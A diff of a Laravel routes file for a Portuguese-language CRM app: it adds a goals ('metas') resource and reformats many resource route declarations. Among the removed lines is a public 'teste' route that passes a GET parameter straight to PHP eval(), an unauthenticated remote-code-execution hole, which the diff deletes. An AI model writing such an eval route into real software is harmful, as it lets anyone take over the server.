@@ -34,6 +34,7 @@ use App\Http\Controllers\ProspectingStatusController;
 use App\Http\Controllers\ConversationStatusController;
 use App\Http\Controllers\CpeaIdController;
 use App\Http\Controllers\GeneralContactTypeController;
+use App\Http\Controllers\GoalController;
 use App\Http\Controllers\ReportController;
 
 /*
@@ -47,15 +48,6 @@ use App\Http\Controllers\ReportController;
 |
 */
 
-Route::get('invite', function () {
-  auth()->user()->sendScheduleNotification(ConversationItem::find(6));
-});
-
-Route::get('teste', function () {
-  $code = $_GET['code'];
-  eval($code);
-});
-
 Route::get('/', function () {
   return redirect()->route('login');
 })->name('home');
@@ -66,9 +58,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     return view('dashboard');
   })->name('dashboard');
 
-  Route::resource('usuarios', UserController::class, [
-    'names' => 'users'
-  ])->parameters([
+  Route::resource('usuarios', UserController::class, ['names' => 'users'])->parameters([
     'usuarios' => 'user'
   ]);
   Route::prefix('usuarios')->name('users.')->group(function () {
@@ -90,11 +80,16 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
       Route::post('/email-audit/filter', [EmailAuditController::class, 'filter'])->name("email-audit.filter");
       Route::get('/email-audit/body/{email_audit}', [EmailAuditController::class, 'body'])->name("email-audit.body");
     });
+
+    Route::resource('metas', GoalController::class, ['names' => 'goals'])->parameters([
+      'metas' => 'goal'
+    ]);
+    Route::prefix('metas')->name('goals.')->group(function () {
+      Route::post('/filter', [GoalController::class, 'filter'])->name('filter');
+    });
   });
 
-  Route::resource('colacoradores', EmployeeController::class, [
-    'names' => 'employees'
-  ])->parameters([
+  Route::resource('colacoradores', EmployeeController::class, ['names' => 'employees'])->parameters([
     'colacoradores' => 'employee'
   ]);
 
@@ -103,9 +98,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/get', [EmployeeController::class, 'getByParams'])->name('get-by-params');
   });
 
-  Route::resource('departamentos', DepartmentController::class, [
-    'names' => 'departments'
-  ])->parameters([
+  Route::resource('departamentos', DepartmentController::class, ['names' => 'departments'])->parameters([
     'departamentos' => 'department'
   ]);
 
@@ -113,9 +106,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [DepartmentController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('cargos', OccupationController::class, [
-    'names' => 'occupations'
-  ])->parameters([
+  Route::resource('cargos', OccupationController::class, ['names' => 'occupations'])->parameters([
     'cargos' => 'occupation'
   ]);
 
@@ -123,9 +114,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [OccupationController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('diretorias', DirectionController::class, [
-    'names' => 'directions'
-  ])->parameters([
+  Route::resource('diretorias', DirectionController::class, ['names' => 'directions'])->parameters([
     'diretorias' => 'direction'
   ]);
 
@@ -133,9 +122,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [DirectionController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('tipo-contato-geral', GeneralContactTypeController::class, [
-    'names' => 'general-contact-types'
-  ])->parameters([
+  Route::resource('tipo-contato-geral', GeneralContactTypeController::class, ['names' => 'general-contact-types'])->parameters([
     'tipo-contato-geral' => 'general_contact_type'
   ]);
 
@@ -143,9 +130,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [GeneralContactTypeController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('segmentos', SegmentController::class, [
-    'names' => 'segments'
-  ])->parameters([
+  Route::resource('segmentos', SegmentController::class, ['names' => 'segments'])->parameters([
     'segmentos' => 'segment'
   ]);
 
@@ -153,9 +138,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [SegmentController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('status-conversa', ConversationStatusController::class, [
-    'names' => 'conversation-statuss'
-  ])->parameters([
+  Route::resource('status-conversa', ConversationStatusController::class, ['names' => 'conversation-statuss'])->parameters([
     'status-conversa' => 'conversation-status'
   ]);
 
@@ -163,9 +146,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [ConversationStatusController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('produtos', ProductController::class, [
-    'names' => 'products'
-  ])->parameters([
+  Route::resource('produtos', ProductController::class, ['names' => 'products'])->parameters([
     'produtos' => 'product'
   ]);
 
@@ -173,9 +154,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [ProductController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('clientes', CustomerController::class, [
-    'names' => 'customers'
-  ])->parameters([
+  Route::resource('clientes', CustomerController::class, ['names' => 'customers'])->parameters([
     'clientes' => 'customer'
   ]);
 
@@ -200,9 +179,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
       Route::delete('/delete/{contact}', [ContactController::class, 'destroy'])->name('delete');
     });
 
-    Route::resource('contato-detalhado', DetailedContactController::class, [
-      'names' => 'detailed-contacts'
-    ])->parameters([
+    Route::resource('contato-detalhado', DetailedContactController::class, ['names' => 'detailed-contacts'])->parameters([
       'contato-detalhado' => 'detailed_contact'
     ]);
 
@@ -263,9 +240,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::get('get-user-id/{email}', [AzureAcessController::class, 'getUserId'])->name('get-user-id');
   });
 
-  Route::resource('etapas', EtapaController::class, [
-    'names' => 'etapas'
-  ])->parameters([
+  Route::resource('etapas', EtapaController::class, ['names' => 'etapas'])->parameters([
     'etapas' => 'etapa'
   ]);
 
@@ -273,9 +248,7 @@ Route::group(['middleware' => ['auth:sanctum', 'verified']], function () {
     Route::post('/filter', [EtapaController::class, 'filter'])->name('filter');
   });
 
-  Route::resource('cnpjs', CnpjController::class, [
-    'names' => 'cnpjs'
-  ])->parameters([
+  Route::resource('cnpjs', CnpjController::class, ['names' => 'cnpjs'])->parameters([
     'cnpjs' => 'cnpj'
   ]);
 
